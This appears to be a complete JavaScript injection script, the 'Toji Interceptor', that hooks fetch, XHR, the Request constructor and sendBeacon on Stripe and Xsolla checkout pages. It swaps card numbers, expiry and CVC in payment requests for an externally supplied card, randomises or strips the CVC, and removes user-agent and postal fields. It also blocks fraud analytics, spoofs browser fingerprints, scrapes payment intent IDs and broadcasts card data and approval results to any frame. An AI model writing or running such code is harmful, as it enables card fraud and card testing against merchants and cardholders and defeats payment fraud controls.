(function () {
    // ── Pre-emptive Sync (Professional Stealth Bridge) ─────────────────────
    // Check window.name for synchronous data transfer (cross-origin bypass)
    let realCard = null;
    let eliteSettings = {
        cvcModifier: 'normal',
        customCvc: '',
        removePaymentAgent: true,
        removeZipCode: false,
        blockAnalytics: true
    };

    const tojiLog = (msg, data = '') => {
        console.log(`%c[TOJI_INTERCEPTOR]%c ${msg}`, 'background: #ff0055; color: #fff; font-weight: bold; padding: 2px 5px; border-radius: 3px;', 'color: #00ffcc;', data);
    };

    /**
     * Deep Store Scraper: Extracts all Stripe identity tokens from any source.
     * Captures: pi_..., seti_..., cs_..., pm_..., src_..., and _secret_...
     */
    const extractStripeIds = (data) => {
        if (!data) return [];
        const str = typeof data === 'string' ? data : JSON.stringify(data);
        // Regex for pi_, seti_, cs_, pm_, src_, tok_, sub_ and their _secret_ variants
        const regex = /(pi_[a-zA-Z0-9]+|seti_[a-zA-Z0-9]+|cs_[a-zA-Z0-9]+|pm_[a-zA-Z0-9]+|src_[a-zA-Z0-9]+|tok_[a-zA-Z0-9]+|sub_[a-zA-Z0-9]+|[a-zA-Z0-9_]+_secret_[a-zA-Z0-9]+)/g;
        const matches = str.match(regex) || [];

        const cleanIds = Array.from(new Set(matches.map(m => {
            if (m.includes('_secret_')) return m.split('_secret_')[0];
            return m;
        })));

        return cleanIds;
    };

    const trySync = (data) => {
        if (data && (data.type === 'SET_REAL_CARD' || data.type === 'TOJI_SYNC')) {
            realCard = data.card;
            if (data.elite) eliteSettings = { ...eliteSettings, ...data.elite };
            tojiLog('🛡️ Armed & Ready. Card Binary Locked:', realCard.number.slice(0, 6) + '...');
        }
    };

    // Initial Sync from window.name (instant, no delay)
    try {
        const nameData = JSON.parse(window.name);
        if (nameData.type === 'TOJI_SYNC') trySync(nameData);
    } catch (e) { }

    // Message Listener for dynamic updates
    window.addEventListener('message', (event) => trySync(event.data));
    if (window.self !== window.top) {
        try { window.top.postMessage({ type: 'TOJI_SYNC_REQUEST' }, '*'); } catch (e) { }
    }

    // ── Constants & Helpers ────────────────────────────────────────────────
    const originalFetch = window.fetch;
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    const originalRequest = window.Request;
    const originalSendBeacon = navigator.sendBeacon;

    const isTargetURL = (url) => {
        const u = url.toLowerCase();
        return u.includes('stripe.com/v1/') || u.includes('xsolla.com') || u.includes('confirm') || u.includes('payment_intents') || u.includes('tokens');
    };

    // ── Recursive Object Walker (JSON Support) ─────────────────────────────
    const tojiRecursiveReplace = (obj) => {
        if (!obj || typeof obj !== 'object' || !realCard) return obj;

        const [expM, expY] = realCard.expiry.split('/');
        const fullY = expY.length === 2 ? '20' + expY : expY;
        const rawNum = realCard.number.replace(/\D/g, '');

        let finalCvc = realCard.cvc;
        if (eliteSettings.cvcModifier === 'random') finalCvc = Math.floor(Math.random() * 900 + 100).toString();
        else if (eliteSettings.cvcModifier === 'custom' && eliteSettings.customCvc) finalCvc = eliteSettings.customCvc;

        for (let key in obj) {
            if (typeof obj[key] === 'object') {
                tojiRecursiveReplace(obj[key]);
                continue;
            }

            const k = key.toLowerCase();
            if (k.includes('number')) obj[key] = rawNum;
            else if (k.includes('cvc') || k.includes('cvv')) {
                if (eliteSettings.cvcModifier === 'remove') delete obj[key];
                else obj[key] = finalCvc;
            }
            else if (k.includes('exp_month') || k === 'month') obj[key] = expM;
            else if (k.includes('exp_year') || k === 'year') obj[key] = fullY;
            else if (eliteSettings.removePaymentAgent && k.includes('payment_user_agent')) delete obj[key];
            else if (eliteSettings.removeZipCode && (k.includes('zip') || k.includes('postal'))) delete obj[key];
        }
        return obj;
    };

    // ── Universal Substitution Engine (String/FormData/Binary) ───────────
    const performSubstitution = (body, url = '') => {
        if (!realCard || !body) return body;

        try {
            const [expM, expY] = realCard.expiry.split('/');
            const fullY = expY.length === 2 ? '20' + expY : expY;
            const rawNum = realCard.number.replace(/\D/g, '');

            let finalCvc = realCard.cvc;
            if (eliteSettings.cvcModifier === 'random') finalCvc = Math.floor(Math.random() * 900 + 100).toString();
            else if (eliteSettings.cvcModifier === 'custom' && eliteSettings.customCvc) finalCvc = eliteSettings.customCvc;

            // 1. Binary Handling (ArrayBuffer/Uint8Array)
            if (body instanceof ArrayBuffer || ArrayBuffer.isView(body)) {
                const decoder = new TextDecoder();
                const encoder = new TextEncoder();
                let text = decoder.decode(body);
                let swapped = performSubstitution(text, url); // Recurse with string logic
                return encoder.encode(swapped);
            }

            // 2. Prepare string for regex/sync
            let bodyStr = '';
            if (typeof body === 'string') {
                bodyStr = body;
            } else if (body instanceof URLSearchParams) {
                bodyStr = body.toString();
            } else {
                try { bodyStr = JSON.stringify(body); } catch (e) { }
            }

            // 3. JSON Object Processing
            if (typeof body === 'string') {
                let s = body.trim();
                if (s.startsWith('{') || s.startsWith('[')) {
                    try {
                        let json = JSON.parse(s);
                        tojiRecursiveReplace(json);
                        body = JSON.stringify(json);
                        bodyStr = body;
                    } catch (e) { }
                }
            }

            // 4. Aggressive Regex (Key Agnostic)
            if (typeof body === 'string') {
                body = body.replace(/([^"&=]*number[^"&=]*)\s*=\s*[^&]*/gi, `$1=${rawNum}`)
                    .replace(/([^"&=]*cvc[^"&=]*)\s*=\s*[^&]*/gi, `$1=${finalCvc}`)
                    .replace(/([^"&=]*cvv[^"&=]*)\s*=\s*[^&]*/gi, `$1=${finalCvc}`)
                    .replace(/([^"&=]*exp_month[^"&=]*)\s*=\s*[^&]*/gi, `$1=${expM}`)
                    .replace(/([^"&=]*exp_year[^"&=]*)\s*=\s*[^&]*/gi, `$1=${fullY}`);

                if (eliteSettings.removePaymentAgent) body = body.replace(/payment_user_agent=[^&]*&?/g, '');
                if (eliteSettings.removeZipCode) body = body.replace(/zip=[^&]*&?/g, '').replace(/postal_code=[^&]*&?/g, '');

                body = body.replace(/&$/g, '');
            }

            // 5. Deep Vault Sync (The "Elite" Method)
            if (realCard) {
                const bodyIds = extractStripeIds(bodyStr);
                const urlIds = extractStripeIds(url);
                const allIds = Array.from(new Set([...bodyIds, ...urlIds]));

                if (allIds.length > 0) {
                    tojiLog('💎 Vault Sync Triggered:', allIds);
                    window.top.postMessage({
                        type: 'TOJI_INTENT_SYNC',
                        intentIds: allIds,
                        card: realCard
                    }, '*');
                } else {
                    tojiLog('⚠️ No IDs identified in request.', { url, body: bodyStr.slice(0, 50) });
                }
            }

            return body;
        } catch (e) {
            console.error('[Toji] Substitution Error:', e);
            return body;
        }
    };

    // ── NUCLEAR HOOK: Request Constructor ─────────────────────────────────
    // Intercepting at the source: When a Request object is created.
    window.Request = function (input, init) {
        if (init && init.body && realCard) {
            const url = (input instanceof Request) ? input.url : input.toString();
            if (isTargetURL(url)) {
                console.log('[Toji] ☢️ Nuclear Intercept (Request Constructor):', url);
                init.body = performSubstitution(init.body, url);
            }
        }
        return new originalRequest(input, init);
    };
    window.Request.prototype = originalRequest.prototype;

    // ── Fetch Hook (Fallback Layer) ────────────────────────────────────────
    window.fetch = async function (input, init) {
        let url = (input instanceof Request) ? input.url : input.toString();
        let options = init || {};

        if (eliteSettings.blockAnalytics && (url.includes('q.stripe.com') || url.includes('analytics'))) {
            return new Response(JSON.stringify({ status: 'ok' }), { status: 200 });
        }

        if (isTargetURL(url) && realCard) {
            console.log('[Toji] 🛡️ Intercepting Fetch:', url);
            if (input instanceof Request) {
                // If the constructor hook missed it, we handle it here
                const originalBody = await input.clone().text();
                const modifiedBody = performSubstitution(originalBody, url);
                input = new Request(input, { body: modifiedBody, duplex: 'half' });
            } else if (options.body) {
                options.body = performSubstitution(options.body, url);
            }
        }

        const resp = await originalFetch.call(this, input, options);
        if (isTargetURL(url)) {
            try {
                const clone = resp.clone();
                const json = await clone.json();
                processResponse(json, url);
            } catch (e) { }
        }
        return resp;
    };

    // ── XHR Hook ──────────────────────────────────────────────────────────
    XMLHttpRequest.prototype.open = function (method, url) {
        this._toji_url = url;
        return originalXHROpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function (body) {
        const url = this._toji_url || '';
        if (isTargetURL(url) && realCard && body) {
            console.log('[Toji] 🛡️ Intercepting XHR:', url);
            arguments[0] = performSubstitution(body, url);
        }
        this.addEventListener('load', () => {
            try { processResponse(JSON.parse(this.responseText), url); } catch (e) { }
        });
        return originalXHRSend.apply(this, arguments);
    };

    // ── Beacon Hook ───────────────────────────────────────────────────────
    navigator.sendBeacon = function (url, data) {
        if (isTargetURL(url) && realCard) {
            console.log('[Toji] 🛡️ Intercepting Beacon:', url);
            data = performSubstitution(data, url);
        }
        return originalSendBeacon.call(this, url, data);
    };

    function processResponse(json, url) {
        if (!json) return;

        // 1. Extract Machine Status from Various Stripe Objects
        const err = json.error || json.last_payment_error || (json.payment_intent && json.payment_intent.last_payment_error) || (json.setup_intent && json.setup_intent.last_setup_error) || (json.decline_code ? json : null);
        const status = json.status || json.payment_status || (json.payment_intent && json.payment_intent.status) || (json.setup_intent && json.setup_intent.status) || (json.subscription && json.subscription.status) || (json.state);

        // 2. Comprehensive Hit Detection (The 'Nuclear' List)
        const successTags = ['succeeded', 'paid', 'active', 'complete', 'completed', 'processed'];
        const isSuccessStatus = successTags.includes(String(status).toLowerCase());
        const isTokenHit = json.object === 'token';
        const isWebhookHit = (url.includes('webhook') || json.object === 'event') && json.completed === true;

        if (err || isSuccessStatus || isTokenHit || isWebhookHit) {
            let msg = 'Success';
            if (err) {
                // Machine Status Priority (Strict Deep Store Style)
                const mainCode = (err.decline_code || err.code || 'DECLINED').toUpperCase();
                const subMsg = err.message ? `: ${err.message}` : '';
                msg = `${mainCode}${subMsg}`;
            } else if (isTokenHit) {
                msg = 'TOKEN_GENERATED';
            } else if (isWebhookHit) {
                msg = 'WEBHOOK_CONFIRMED';
            } else if (status) {
                msg = String(status).toUpperCase();
            }

            // Scrape ALL IDs from response AND url (absolute source of truth)
            const jsonIds = extractStripeIds(json);
            const urlIds = extractStripeIds(url);
            const allIds = Array.from(new Set([...jsonIds, ...urlIds]));

            const payload = {
                type: 'TOJI_CAPTURE',
                success: (isSuccessStatus || isTokenHit || isWebhookHit) && !err,
                message: msg,
                url,
                intentIds: allIds, // Pass all IDs found
                card: realCard,  // Local carry
                data: json
            };

            // Broadcast to all frames
            window.top.postMessage(payload, '*');
            window.postMessage(payload, '*');
        }
    }

    // Fingerprint Bypasser
    try {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    } catch (e) { }

    console.log('[Toji Project] ☢️ Nuclear Interceptor Active (v1.0-beta)');
})();
